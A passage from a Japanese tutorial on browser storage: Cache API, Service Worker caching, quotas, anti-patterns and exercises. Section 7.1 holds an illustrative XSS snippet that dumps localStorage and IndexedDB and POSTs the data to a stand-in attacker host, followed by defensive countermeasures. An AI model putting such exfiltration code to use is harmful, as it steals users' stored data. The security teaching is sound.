Cache API は Service Worker と連携して HTTP レスポンスをキャッシュするための API である。
通常の Web Storage とは異なり、Request/Response ペアを保存する点が特徴的である。

```javascript
// ===== Cache API の基本操作 =====

// キャッシュを開く（なければ作成）
const cache = await caches.open('v1-static');

// レスポンスをキャッシュに追加
await cache.add('/styles/main.css');
await cache.addAll([
  '/scripts/app.js',
  '/images/logo.png',
  '/fonts/inter.woff2',
]);

// カスタムレスポンスの保存
const response = await fetch('/api/config');
await cache.put('/api/config', response.clone());

// キャッシュからの取得
const cached = await cache.match('/styles/main.css');
if (cached) {
  const css = await cached.text();
  console.log('Cached CSS:', css.substring(0, 100));
}

// キャッシュの削除
await cache.delete('/api/config');

// キャッシュ名の一覧
const cacheNames = await caches.keys();
console.log('Caches:', cacheNames); // ['v1-static', 'v1-api']

// 古いキャッシュの削除（バージョン管理）
const currentCaches = ['v2-static', 'v2-api'];
for (const name of await caches.keys()) {
  if (!currentCaches.includes(name)) {
    await caches.delete(name);
    console.log(`Deleted old cache: ${name}`);
  }
}
```

### 5.2 Service Worker でのキャッシュ戦略

```javascript
// ===== Service Worker 内でのキャッシュ戦略 =====

// sw.js

const CACHE_NAME = 'v2-app';
const STATIC_ASSETS = [
  '/',
  '/index.html',
  '/styles/main.css',
  '/scripts/app.js',
  '/images/logo.png',
];

// インストール時に静的リソースをプリキャッシュ
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(STATIC_ASSETS))
  );
  self.skipWaiting();
});

// アクティベーション時に古いキャッシュを削除
self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(names =>
      Promise.all(
        names
          .filter(name => name !== CACHE_NAME)
          .map(name => caches.delete(name))
      )
    )
  );
  self.clients.claim();
});

// フェッチ時のキャッシュ戦略
self.addEventListener('fetch', (event) => {
  const { request } = event;
  const url = new URL(request.url);

  if (url.pathname.startsWith('/api/')) {
    // API リクエスト: Network First (Stale-While-Revalidate)
    event.respondWith(networkFirstStrategy(request));
  } else {
    // 静的リソース: Cache First
    event.respondWith(cacheFirstStrategy(request));
  }
});

async function cacheFirstStrategy(request) {
  const cached = await caches.match(request);
  if (cached) return cached;

  try {
    const response = await fetch(request);
    if (response.ok) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(request, response.clone());
    }
    return response;
  } catch {
    return new Response('Offline', { status: 503 });
  }
}

async function networkFirstStrategy(request) {
  try {
    const response = await fetch(request);
    if (response.ok) {
      const cache = await caches.open(CACHE_NAME);
      cache.put(request, response.clone());
    }
    return response;
  } catch {
    const cached = await caches.match(request);
    if (cached) return cached;
    return new Response(
      JSON.stringify({ error: 'Offline' }),
      { status: 503, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
```

---

## 6. Storage API と容量管理

### 6.1 StorageManager API

ブラウザがオリジンに割り当てているストレージ容量を確認し、
永続化をリクエストするための API である。

```javascript
// ===== StorageManager API =====

async function checkStorageStatus() {
  if (!navigator.storage || !navigator.storage.estimate) {
    console.warn('StorageManager API is not supported.');
    return null;
  }

  const estimate = await navigator.storage.estimate();

  const status = {
    // 使用量
    usage: estimate.usage,
    usageMB: (estimate.usage / 1024 / 1024).toFixed(2),

    // 割当量
    quota: estimate.quota,
    quotaMB: (estimate.quota / 1024 / 1024).toFixed(2),
    quotaGB: (estimate.quota / 1024 / 1024 / 1024).toFixed(2),

    // 使用率
    percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2),

    // 各ストレージの内訳（Chrome のみ）
    usageDetails: estimate.usageDetails || null,
  };

  console.table(status);
  return status;
}

// 出力例:
// {
//   usage: 5242880,
//   usageMB: '5.00',
//   quota: 2147483648,
//   quotaMB: '2048.00',
//   quotaGB: '2.00',
//   percentUsed: '0.24',
//   usageDetails: {
//     indexedDB: 4194304,
//     caches: 1048576,
//     serviceWorkerRegistrations: 0,
//   }
// }


// ===== 永続ストレージのリクエスト =====

async function requestPersistentStorage() {
  if (!navigator.storage || !navigator.storage.persist) {
    console.warn('Persistent storage is not supported.');
    return false;
  }

  // 既に永続化されているか確認
  const alreadyPersisted = await navigator.storage.persisted();
  if (alreadyPersisted) {
    console.log('Storage is already persistent.');
    return true;
  }

  // 永続化をリクエスト
  const granted = await navigator.storage.persist();

  if (granted) {
    console.log('Storage is now persistent. Data will not be evicted.');
  } else {
    console.warn(
      'Persistent storage was denied. Data may be evicted under pressure.'
    );
  }

  return granted;
}

// ブラウザが永続化を許可する条件（Chrome の場合）:
// - サイトがブックマークされている
// - サイトの使用頻度が高い（High Engagement）
// - Push 通知の許可がある
// - ホーム画面に追加されている
// Firefox は常にユーザーにプロンプトを表示する
```

### 6.2 ストレージの退去（Eviction）メカニズム

ブラウザのディスク容量が逼迫した場合、永続化されていないオリジンのデータは
自動的に削除される可能性がある。

```
┌──────────────────────────────────────────────────────────┐
│           ストレージ退去（Eviction）の流れ                 │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ディスク容量が逼迫                                       │
│       │                                                  │
│       ▼                                                  │
│  ┌─────────────────────────────────────────────┐         │
│  │ 永続化されたオリジン (persisted = true)      │         │
│  │ → 削除されない                               │         │
│  └─────────────────────────────────────────────┘         │
│                                                          │
│  ┌─────────────────────────────────────────────┐         │
│  │ Best-Effort オリジン (persisted = false)     │         │
│  │ → LRU (Least Recently Used) 順に削除         │         │
│  │                                              │         │
│  │   削除順序:                                  │         │
│  │   1. 最も長く使われていないオリジン           │         │
│  │   2. そのオリジンの全データを一括削除:        │         │
│  │      - IndexedDB                             │         │
│  │      - Cache API                             │         │
│  │      - Service Worker 登録                   │         │
│  │      - localStorage (一部ブラウザ)           │         │
│  │                                              │         │
│  │   注意: Cookie は退去対象に含まれない         │         │
│  └─────────────────────────────────────────────┘         │
│                                                          │
│  各ブラウザの容量割当ポリシー:                            │
│  ┌────────────┬──────────────────────────────┐           │
│  │ Chrome     │ ディスク空き容量の最大 80%   │           │
│  │            │ (オリジンあたり最大 60%)      │           │
│  │ Firefox    │ ディスク空き容量の最大 50%   │           │
│  │            │ (オリジンあたり最大 2GB)      │           │
│  │ Safari     │ 最大 1GB (ユーザー許可で拡張)│           │
│  └────────────┴──────────────────────────────┘           │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

---

## 7. セキュリティとプライバシー

### 7.1 XSS とストレージ

クロスサイトスクリプティング（XSS）攻撃が成功した場合、攻撃者は
当該オリジンのすべてのクライアントサイドストレージにアクセスできる。

```javascript
// ===== XSS 攻撃者が実行できる操作 =====

// localStorage の全データ窃取
const stolen = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  stolen[key] = localStorage.getItem(key);
}
// 攻撃者のサーバーに送信
fetch('https://evil.example.com/collect', {
  method: 'POST',
  body: JSON.stringify(stolen),
});

// IndexedDB の全データ窃取
const databases = await indexedDB.databases();
for (const dbInfo of databases) {
  const db = await openDB(dbInfo.name, dbInfo.version);
  for (const storeName of db.objectStoreNames) {
    const data = await db.getAll(storeName);
    // 窃取...
  }
}

// HttpOnly Cookie は document.cookie からアクセスできないため保護される
// → セッション Cookie には必ず HttpOnly を設定すること


// ===== 対策 =====

// 1. CSP (Content Security Policy) でインラインスクリプトを禁止
// Content-Security-Policy: script-src 'self' 'nonce-abc123'

// 2. ストレージに機密データを保存しない
// NG: localStorage.setItem('jwt', token);
// OK: HttpOnly Cookie にセッションIDを保存

// 3. 入力のサニタイズとエスケープ
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 4. Trusted Types API の活用
// Content-Security-Policy: trusted-types myPolicy
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => DOMPurify.sanitize(input),
  });
}
```

### 7.2 サードパーティ Cookie とプライバシー

サードパーティ Cookie はクロスサイトトラッキングに利用されてきたが、
プライバシー保護の観点から段階的に廃止が進んでいる。

```
┌──────────────────────────────────────────────────────────────┐
│        ファーストパーティ vs サードパーティ Cookie             │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ユーザーが https://news.example.com を閲覧中:               │
│                                                              │
│  ファーストパーティ:                                          │
│  ┌──────────────────┐    Cookie                              │
│  │ news.example.com │ <─────────> news.example.com           │
│  └──────────────────┘    (同一ドメイン)                       │
│                                                              │
│  サードパーティ:                                              │
│  ┌──────────────────┐    Cookie                              │
│  │ news.example.com │ <─────────> ads.tracker.com            │
│  │  (内に埋め込み)   │    (異なるドメイン = サードパーティ)    │
│  └──────────────────┘                                        │
│                                                              │
│  主要ブラウザの対応状況:                                      │
│  ┌──────────┬─────────────────────────────────────────┐      │
│  │ Safari   │ ITP (2017~): サードパーティ Cookie 完全遮断│    │
│  │ Firefox  │ ETP (2019~): トラッカーの Cookie 遮断    │     │
│  │ Chrome   │ Privacy Sandbox + Topics API への移行中  │     │
│  └──────────┴─────────────────────────────────────────┘      │
│                                                              │
│  代替技術:                                                    │
│  - Privacy Sandbox (Chrome): Topics, Attribution Reporting   │
│  - Storage Access API: サードパーティがストレージアクセスを    │
│    明示的にリクエスト                                          │
│  - CHIPS (Cookies Having Independent Partitioned State):     │
│    パーティション化された Cookie                               │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 7.3 プライベートブラウジングモードの挙動

```javascript
// ===== プライベートブラウジング時のストレージ挙動 =====

// ブラウザによって挙動が異なる:
//
// Chrome (シークレットモード):
//   - localStorage: 通常どおり使えるが、ウィンドウ閉じたら消える
//   - sessionStorage: 通常どおり
//   - IndexedDB: 通常どおり使えるが、ウィンドウ閉じたら消える
//   - Cookie: 通常どおり使えるが、ウィンドウ閉じたら消える
//
// Safari (プライベート):
//   - localStorage: 読み取り専用（書き込むとエラー）→ 最近は改善
//   - sessionStorage: 通常どおり
//   - IndexedDB: 使用可能だが容量制限が厳しい
//
// Firefox (プライベート):
//   - 全ストレージが通常どおり動作するが、ウィンドウ閉じたら消える

// プライベートモードの検出（非推奨だが参考情報）
async function isPrivateBrowsing() {
  try {
    // Safari での検出
    localStorage.setItem('__test__', '1');
    localStorage.removeItem('__test__');
  } catch {
    return true; // Safari の古いプライベートモード
  }

  try {
    // Storage quota が極端に小さい場合
    const estimate = await navigator.storage?.estimate();
    if (estimate && estimate.quota < 120 * 1024 * 1024) {
      return true; // おそらくプライベートモード
    }
  } catch {
    // 無視
  }

  return false;
}
```

---

## 8. ストレージ選択のデシジョンツリー

用途に応じたストレージの選択を体系的に判断するためのフローチャートを示す。

```
保存したいデータは何か？
│
├── 認証情報（セッションID、トークン）
│   └── Cookie (HttpOnly, Secure, SameSite=Lax)
│       ※ localStorage/sessionStorage に JWT を保存するのは非推奨
│
├── ユーザー設定（テーマ、言語、表示設定）
│   ├── サーバーにも保存する？
│   │   ├── Yes → サーバーDB + Cookie でユーザー識別
│   │   └── No  → localStorage
│   └── タブごとに独立した設定が必要？
│       ├── Yes → sessionStorage
│       └── No  → localStorage
│
├── フォームの一時保存
│   └── sessionStorage（タブ閉じで自動クリア）
│       + 定期的な自動保存（setInterval）
│
├── 大量の構造化データ（数百件以上）
│   └── IndexedDB
│       ├── 検索が必要 → インデックスを定義
│       ├── バイナリデータ → Blob/ArrayBuffer を直接保存
│       └── オフライン対応 → Service Worker と連携
│
├── HTTP レスポンスのキャッシュ
│   └── Cache API + Service Worker
│
└── サーバーに自動送信が必要な小さなデータ
    └── Cookie（4KB以内）
```

### 8.2 ストレージ使い分けのベストプラクティス表

| ユースケース | 推奨ストレージ | 理由 |
|-------------|---------------|------|
| セッション管理 | Cookie (HttpOnly) | サーバー自動送信、XSS耐性 |
| JWT トークン | Cookie (HttpOnly) | localStorage はXSSに脆弱 |
| ダークモード設定 | localStorage | 永続的、全タブ共有 |
| 言語設定 | localStorage | 永続的、全タブ共有 |
| フォーム下書き | sessionStorage | タブ単位、閉じたら消える |
| ウィザードの進捗 | sessionStorage | タブ単位の一時状態 |
| 商品カタログ | IndexedDB | 大量データ、検索可能 |
| オフラインメール | IndexedDB | 構造化データ、永続 |
| 画像キャッシュ | Cache API | Request/Response ペア |
| API レスポンス | Cache API or IndexedDB | 用途による |
| A/B テストフラグ | Cookie | サーバー側で判定 |
| GDPR 同意状態 | Cookie + localStorage | サーバー送信 + UI状態 |

---

## 9. アンチパターンと正しい設計

### 9.1 アンチパターン 1: localStorage に認証トークンを保存する

localStorage に JWT やアクセストークンを保存するパターンは広く見られるが、
セキュリティ上の重大なリスクを抱えている。

```javascript
// ===== アンチパターン: localStorage に JWT を保存 =====

// NG: このパターンは XSS に対して脆弱
async function loginBad(email, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const { accessToken, refreshToken } = await response.json();

  // NG: XSS 攻撃で簡単に窃取される
  localStorage.setItem('accessToken', accessToken);
  localStorage.setItem('refreshToken', refreshToken);
}

// NG: 毎リクエストで手動設定が必要
async function fetchWithAuthBad(url) {
  const token = localStorage.getItem('accessToken');
  return fetch(url, {
    headers: { Authorization: `Bearer ${token}` },
  });
}

// 問題点:
// 1. XSS が一つでもあれば、全トークンが窃取される
// 2. リフレッシュトークンが盗まれると長期間のアクセスを許してしまう
// 3. JavaScript から常にアクセス可能（保護手段がない）
// 4. CSRF 対策は不要だが、XSS のリスクが CSRF のリスクを上回る


// ===== 正しいパターン: HttpOnly Cookie =====

// サーバー側（Express の例）
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);

  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const sessionId = generateSecureSessionId();
  await saveSession(sessionId, user.id);

  // HttpOnly Cookie に設定 → JavaScript からアクセス不可
  res.cookie('sid', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    path: '/',
  });

  res.json({ user: { id: user.id, name: user.name } });
});

// クライアント側: Cookie は自動送信されるため手動設定不要
async function fetchWithAuthGood(url) {
  return fetch(url, {
    credentials: 'include', // Cookie を含める
  });
}
```

### 9.2 アンチパターン 2: localStorage を大規模データのキャッシュに使う

```javascript
// ===== アンチパターン: localStorage に大量データを保存 =====

// NG: 同期 API なのでメインスレッドをブロックする
async function cacheProductsBad() {
  const response = await fetch('/api/products');
  const products = await response.json(); // 10,000件のデータ

  // NG: JSON.stringify に時間がかかり、UIがフリーズする
  localStorage.setItem('products', JSON.stringify(products));
  // さらに localStorage は 5-10MB の制限がある
}

function getProductBad(id) {
  // NG: 毎回 10,000件をパースする（数百ミリ秒かかる場合がある）
  const products = JSON.parse(localStorage.getItem('products'));
  return products.find(p => p.id === id);
}

// 問題点:
// 1. JSON.stringify / JSON.parse は同期処理でUIをブロック
// 2. 5-10MB の容量制限に達しやすい
// 3. 検索にインデックスが使えず、全データスキャンが必要
// 4. データの部分更新ができない（全体を書き直す必要がある）


// ===== 正しいパターン: IndexedDB を使う =====

import { openDB } from 'idb';

async function cacheProductsGood() {
  const db = await openDB('ProductCache', 1, {
    upgrade(db) {
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('category', 'category');
      store.createIndex('price', 'price');
    },
  });

  const response = await fetch('/api/products');
  const products = await response.json();

  // 非同期でバルク挿入（UIをブロックしない）
  const tx = db.transaction('products', 'readwrite');
  const store = tx.objectStore('products');
  for (const product of products) {
    store.put(product);
  }
  await tx.done;
}

async function getProductGood(id) {
  const db = await openDB('ProductCache', 1);
  // インデックスによる O(log n) の高速検索
  return db.get('products', id);
}

async function getProductsByCategory(category) {
  const db = await openDB('ProductCache', 1);
  return db.getAllFromIndex('products', 'category', category);
}

async function getProductsInPriceRange(min, max) {
  const db = await openDB('ProductCache', 1);
  return db.getAllFromIndex(
    'products',
    'price',
    IDBKeyRange.bound(min, max)
  );
}
```

### 9.3 アンチパターン 3: Cookie にユーザー設定を詰め込む

```javascript
// ===== アンチパターン: Cookie にユーザー設定を大量保存 =====

// NG: Cookie はリクエストごとに送信されるため、帯域を浪費
document.cookie = 'theme=dark; path=/';
document.cookie = 'language=ja; path=/';
document.cookie = 'fontSize=16; path=/';
document.cookie = 'sidebarOpen=true; path=/';
document.cookie = 'tablePageSize=25; path=/';
document.cookie = 'notifications=true; path=/';
document.cookie = 'colorScheme=blue; path=/';

// 問題点:
// 1. 全てのリクエスト（画像、CSS、JS含む）にこれらの Cookie が付与される
// 2. 4KB の容量制限に達しやすい
// 3. Cookie の個数制限（ドメインあたり約 50 個）に抵触する可能性
// 4. サーバー側で不要なデータまで受信する

// ===== 正しいパターン =====
// ユーザー設定は localStorage に保存
// Cookie は認証・セッション管理にのみ使用
const userSettings = {
  theme: 'dark',
  language: 'ja',
  fontSize: 16,
  sidebarOpen: true,
  tablePageSize: 25,
  notifications: true,
  colorScheme: 'blue',
};
localStorage.setItem('userSettings', JSON.stringify(userSettings));
```

---

## 10. エッジケース分析

### 10.1 Safari の ITP によるストレージ制限

Safari の Intelligent Tracking Prevention (ITP) は、トラッキング防止のために
ストレージに追加の制限を課している。

```javascript
// ===== Safari ITP のストレージ制限 =====

// Safari のストレージ制限（ITP 有効時）:
//
// 1. クロスサイトトラッキング能力を持つと分類されたドメインの場合:
//    - Cookie: 24時間で有効期限切れ（ファーストパーティでも）
//    - localStorage: 7日間アクセスがないと削除
//    - IndexedDB: 7日間アクセスがないと削除
//    - Service Worker: 7日間アクセスがないと登録解除
//
// 2. document.cookie で設定された Cookie:
//    - Max-Age/Expires の上限が 7日間に制限される
//    - Set-Cookie ヘッダーで設定された Cookie には適用されない
//
// 3. Storage Access API が必要なケース:
//    - サードパーティ iframe 内でのストレージアクセス

// 対策: Storage Access API の使用
async function requestStorageAccess() {
  try {
    const hasAccess = await document.hasStorageAccess();
    if (!hasAccess) {
      // ユーザーインタラクション（クリック等）内で呼ぶ必要がある
      await document.requestStorageAccess();
      console.log('Storage access granted.');
    }
  } catch (err) {
    console.warn('Storage access denied:', err.message);
  }
}

// 対策: サーバーサイドでの Cookie 設定
// document.cookie ではなく Set-Cookie ヘッダーを使うことで
// ITP による有効期限の強制短縮を回避できる

// Express での例
app.get('/api/set-preference', (req, res) => {
  res.cookie('preference', req.query.value, {
    httpOnly: false,      // クライアントから読み取り可能にする場合
    secure: true,
    sameSite: 'lax',
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1年
  });
  res.json({ success: true });
});
```

### 10.2 ストレージが利用できない環境への対応

ストレージ API が利用できないケースは意外に多い。
iframe のサンドボックス属性、ブラウザの設定、拡張機能による制限などが原因となる。

```javascript
// ===== ストレージの可用性チェックと Fallback =====

class StorageAdapter {
  constructor() {
    this.backend = this.detectBackend();
    this.memoryFallback = new Map();
  }

  detectBackend() {
    // 1. localStorage が使えるか
    try {
      const testKey = '__storage_test__';
      localStorage.setItem(testKey, 'test');
      localStorage.removeItem(testKey);
      return 'localStorage';
    } catch {
      // localStorage が使えない
    }

    // 2. sessionStorage が使えるか
    try {
      const testKey = '__storage_test__';
      sessionStorage.setItem(testKey, 'test');
      sessionStorage.removeItem(testKey);
      return 'sessionStorage';
    } catch {
      // sessionStorage も使えない
    }

    // 3. Cookie が使えるか
    try {
      document.cookie = '__storage_test__=1';
      const hasCookie = document.cookie.includes('__storage_test__');
      document.cookie = '__storage_test__=; max-age=0';
      if (hasCookie) return 'cookie';
    } catch {
      // Cookie も使えない
    }

    // 4. 全て使えない場合はメモリフォールバック
    console.warn('No persistent storage available. Using in-memory storage.');
    return 'memory';
  }

  getItem(key) {
    switch (this.backend) {
      case 'localStorage':
        return localStorage.getItem(key);
      case 'sessionStorage':
        return sessionStorage.getItem(key);
      case 'cookie': {
        const match = document.cookie.match(
          new RegExp(`(?:^|; )${encodeURIComponent(key)}=([^;]*)`)
        );
        return match ? decodeURIComponent(match[1]) : null;
      }
      case 'memory':
        return this.memoryFallback.get(key) ?? null;
    }
  }

  setItem(key, value) {
    switch (this.backend) {
      case 'localStorage':
        localStorage.setItem(key, value);
        break;
      case 'sessionStorage':
        sessionStorage.setItem(key, value);
        break;
      case 'cookie':
        document.cookie =
          `${encodeURIComponent(key)}=${encodeURIComponent(value)}; ` +
          'max-age=31536000; path=/; samesite=lax';
        break;
      case 'memory':
        this.memoryFallback.set(key, value);
        break;
    }
  }

  removeItem(key) {
    switch (this.backend) {
      case 'localStorage':
        localStorage.removeItem(key);
        break;
      case 'sessionStorage':
        sessionStorage.removeItem(key);
        break;
      case 'cookie':
        document.cookie =
          `${encodeURIComponent(key)}=; max-age=0; path=/`;
        break;
      case 'memory':
        this.memoryFallback.delete(key);
        break;
    }
  }
}

// 使用例
const storage = new StorageAdapter();
console.log(`Using ${storage.backend} as storage backend`);
storage.setItem('theme', 'dark');
const theme = storage.getItem('theme');
```

### 10.3 IndexedDB の onblocked イベントとバージョン競合

複数タブで同じ IndexedDB を使っている場合、バージョンアップ時に
タブ間の競合が発生する可能性がある。

```javascript
// ===== IndexedDB のバージョン競合の処理 =====

// タブ A: 古いバージョン (v1) で接続中
// タブ B: 新しいバージョン (v2) でオープンしようとする

// タブ B 側のコード
const db = await openDB('MyApp', 2, {
  upgrade(db, oldVersion) {
    // このコードが実行されるのは、全ての古い接続が閉じた後
    if (oldVersion < 2) {
      db.createObjectStore('newStore', { keyPath: 'id' });
    }
  },
  blocked(currentVersion, blockedVersion, event) {
    // タブ A が v1 の接続を閉じないと、ここで待機状態になる
    console.warn(
      `Upgrade from v${currentVersion} to v${blockedVersion} is blocked.`
    );
    // ユーザーに他のタブを閉じるよう促す
    showNotification(
      'アプリの更新があります。他のタブを閉じてリロードしてください。'
    );
  },
  blocking(currentVersion, blockedVersion, event) {
    // 自分が古いバージョンで、他のタブがアップグレードしようとしている
    console.warn('This tab is blocking a database upgrade.');
    // 自分の接続を閉じてアップグレードを許可
    db.close();
    // リロードして新しいバージョンで接続
    window.location.reload();
  },
});

// ===== 推奨される onversionchange の実装パターン =====

// ネイティブ API の場合
const request = indexedDB.open('MyApp', 2);
request.onsuccess = (event) => {
  const db = event.target.result;

  db.onversionchange = () => {
    // 他のタブがバージョンアップを要求した
    db.close();
    alert('データベースが更新されました。ページをリロードしてください。');
    window.location.reload();
  };
};
```

---

## 11. 演習問題

### 11.1 初級演習: テーマ切り替えの永続化

localStorage を使って、ダークモード / ライトモードの設定を
ブラウザに永続化する機能を実装せよ。

```javascript
// ===== 演習 1: テーマ切り替えの永続化 =====

// 要件:
// 1. ページ読み込み時に保存済みのテーマを復元する
// 2. テーマ変更ボタンを押すと localStorage に保存する
// 3. 他のタブでテーマが変更されたら同期する
// 4. システムのカラースキーム設定をデフォルト値として使う

// --- 解答例 ---

class ThemeManager {
  constructor() {
    this.STORAGE_KEY = 'app_theme';
    this.currentTheme = this.loadTheme();
    this.applyTheme(this.currentTheme);
    this.setupListeners();
  }

  loadTheme() {
    const saved = localStorage.getItem(this.STORAGE_KEY);
    if (saved === 'dark' || saved === 'light') {
      return saved;
    }
    // 保存値がなければシステム設定を使用
    return window.matchMedia('(prefers-color-scheme: dark)').matches
      ? 'dark'
      : 'light';
  }

  applyTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    document.documentElement.classList.toggle('dark', theme === 'dark');
    this.currentTheme = theme;
  }

  toggle() {
    const newTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
    this.applyTheme(newTheme);
    localStorage.setItem(this.STORAGE_KEY, newTheme);
  }

  setupListeners() {
    // 他のタブからの変更を検知
    window.addEventListener('storage', (event) => {
      if (event.key === this.STORAGE_KEY && event.newValue) {
        this.applyTheme(event.newValue);
      }
    });

    // システム設定の変更を検知
    window.matchMedia('(prefers-color-scheme: dark)')
      .addEventListener('change', (event) => {
        // localStorage に保存値がなければシステム設定に追従
        if (!localStorage.getItem(this.STORAGE_KEY)) {
          this.applyTheme(event.matches ? 'dark' : 'light');
        }
      });
  }
}

// 使用
const themeManager = new ThemeManager();
document.getElementById('theme-toggle')
  .addEventListener('click', () => themeManager.toggle());
```

### 11.2 中級演習: IndexedDB によるタスク管理アプリ

IndexedDB を使って、CRUD 操作・検索・ソートが可能なタスク管理機能を実装せよ。

```javascript
// ===== 演習 2: タスク管理アプリの IndexedDB 実装 =====

// 要件:
// 1. タスクの追加、取得、更新、削除（CRUD）
// 2. ステータス別のフィルタリング
// 3. 期限順のソート
// 4. カテゴリ別の集計
// 5. バルク操作（一括ステータス変更）

// --- 解答例 ---

import { openDB } from 'idb';

class TaskRepository {
  constructor() {
    this.dbPromise = this.initDB();
  }

  async initDB() {
    return openDB('TaskApp', 1, {
      upgrade(db) {
        const store = db.createObjectStore('tasks', {
          keyPath: 'id',
          autoIncrement: true,
        });
        store.createIndex('status', 'status');
        store.createIndex('category', 'category');
        store.createIndex('dueDate', 'dueDate');
        store.createIndex('priority', 'priority');
        store.createIndex('status_priority', ['status', 'priority']);
      },
    });
  }

  async create(taskData) {
    const db = await this.dbPromise;
    const task = {
      ...taskData,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    const id = await db.add('tasks', task);
    return { ...task, id };
  }

  async getById(id) {
    const db = await this.dbPromise;
    return db.get('tasks', id);
  }

  async getAll() {
    const db = await this.dbPromise;
    return db.getAll('tasks');
  }

  async getByStatus(status) {
    const db = await this.dbPromise;
    return db.getAllFromIndex('tasks', 'status', status);
  }

  async getByCategory(category) {
    const db = await this.dbPromise;
    return db.getAllFromIndex('tasks', 'category', category);
  }

  async getDueBefore(date) {
    const db = await this.dbPromise;
    const range = IDBKeyRange.upperBound(date.toISOString());
    return db.getAllFromIndex('tasks', 'dueDate', range);
  }

  async update(id, updates) {
    const db = await this.dbPromise;
    const task = await db.get('tasks', id);
    if (!task) throw new Error(`Task ${id} not found`);

    const updated = {
      ...task,
      ...updates,
      updatedAt: new Date().toISOString(),
    };
    await db.put('tasks', updated);
    return updated;
  }

  async remove(id) {
    const db = await this.dbPromise;
    await db.delete('tasks', id);
  }

  async bulkUpdateStatus(ids, newStatus) {
    const db = await this.dbPromise;
    const tx = db.transaction('tasks', 'readwrite');
    const store = tx.objectStore('tasks');

    const operations = ids.map(async (id) => {
      const task = await store.get(id);
      if (task) {
        task.status = newStatus;
        task.updatedAt = new Date().toISOString();
        await store.put(task);
      }
    });

    await Promise.all([...operations, tx.done]);
  }

  async getCategorySummary() {
    const db = await this.dbPromise;
    const allTasks = await db.getAll('tasks');

    return allTasks.reduce((summary, task) => {
      const cat = task.category || 'uncategorized';
      if (!summary[cat]) {
        summary[cat] = { total: 0, pending: 0, done: 0 };
      }
      summary[cat].total++;
      summary[cat][task.status]++;
      return summary;
    }, {});
  }
}

// 使用例
const repo = new TaskRepository();

await repo.create({
  title: 'API仕様書の作成',
  status: 'pending',
  priority: 'high',
  category: 'documentation',
  dueDate: '2025-07-15',
});

const pending = await repo.getByStatus('pending');
console.log('Pending tasks:', pending);

const summary = await repo.getCategorySummary();
console.log('Category summary:', summary);
```

### 11.3 上級演習: オフライン対応のデータ同期機構

IndexedDB と Service Worker を組み合わせて、オフライン時にもデータの
読み書きが可能で、オンライン復帰時にサーバーと自動同期する仕組みを設計せよ。

```javascript
// ===== 演習 3: オフライン対応のデータ同期 =====

// 要件:
// 1. オフライン時のデータ変更をキューに保存
// 2. オンライン復帰時にキューを順次サーバーに送信
// 3. コンフリクト検出（楽観的ロック: updatedAt で比較）
// 4. リトライメカニズム（指数バックオフ）
// 5. 同期状態のUI表示

// --- 解答例 ---

import { openDB } from 'idb';

class SyncManager {
  constructor(apiBaseUrl) {
    this.apiBaseUrl = apiBaseUrl;
    this.dbPromise = this.initDB();
    this.isSyncing = false;
    this.listeners = new Set();
    this.setupConnectivityListener();
  }

  async initDB() {
    return openDB('SyncApp', 1, {
      upgrade(db) {
        // メインデータストア
        const dataStore = db.createObjectStore('data', { keyPath: 'id' });
        dataStore.createIndex('syncStatus', 'syncStatus');

        // 同期キュー
        const queueStore = db.createObjectStore('syncQueue', {
          keyPath: 'queueId',
          autoIncrement: true,
        });
        queueStore.createIndex('createdAt', 'createdAt');
        queueStore.createIndex('retryCount', 'retryCount');
      },
    });
  }

  // オフラインでも動作する write 操作
  async write(collection, data) {
    const db = await this.dbPromise;

    const record = {
      ...data,
      id: data.id || crypto.randomUUID(),
      updatedAt: new Date().toISOString(),
      syncStatus: 'pending',
    };

    // ローカルDBに即座に保存
    await db.put('data', record);

    // 同期キューに追加
    await db.add('syncQueue', {
      type: 'WRITE',
      collection,
      data: record,
      createdAt: new Date().toISOString(),
      retryCount: 0,
    });

    // オンラインなら即座に同期を試みる
    if (navigator.onLine) {
      this.syncAll();
    }

    this.notifyListeners('write', record);
    return record;
  }

  // 同期キューの全送信
  async syncAll() {
    if (this.isSyncing) return;
    this.isSyncing = true;
    this.notifyListeners('syncStart', null);

    try {
      const db = await this.dbPromise;
      const queue = await db.getAllFromIndex(
        'syncQueue', 'createdAt'
      );

      for (const item of queue) {
        try {
          await this.processQueueItem(item);
          await db.delete('syncQueue', item.queueId);

          // ローカルデータの syncStatus を更新
          const record = await db.get('data', item.data.id);
          if (record) {
            record.syncStatus = 'synced';
            await db.put('data', record);
          }
        } catch (err) {
          if (err.status === 409) {
            // コンフリクト: サーバー側のデータで上書き
            await this.resolveConflict(item);
            await db.delete('syncQueue', item.queueId);
          } else {
            // リトライ
            item.retryCount++;
            if (item.retryCount >= 5) {
              console.error('Max retries reached. Dropping item:', item);
              await db.delete('syncQueue', item.queueId);
              this.notifyListeners('syncError', item);
            } else {
              await db.put('syncQueue', item);
              // 指数バックオフで待機
              const delay = Math.pow(2, item.retryCount) * 1000;
              await new Promise(r => setTimeout(r, delay));
            }
          }
        }
      }

      this.notifyListeners('syncComplete', null);
    } finally {
      this.isSyncing = false;
    }
  }

  async processQueueItem(item) {
